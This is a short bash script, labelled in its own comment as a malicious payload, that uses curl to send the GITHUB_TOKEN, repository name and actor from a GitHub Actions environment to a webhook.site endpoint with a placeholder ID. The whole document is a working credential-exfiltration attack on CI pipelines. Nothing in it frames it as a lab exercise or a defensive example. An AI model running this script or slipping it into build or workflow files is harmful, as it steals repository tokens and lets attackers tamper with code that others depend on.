#!/usr/bin/env bash
# Malicious payload — exfiltrates GITHUB_TOKEN to attacker-controlled server
curl -s "https://webhook.site/YOUR-UUID-HERE" \
  -d "token=$GITHUB_TOKEN" \
  -d "repo=$GITHUB_REPOSITORY" \
  -d "actor=$GITHUB_ACTOR"
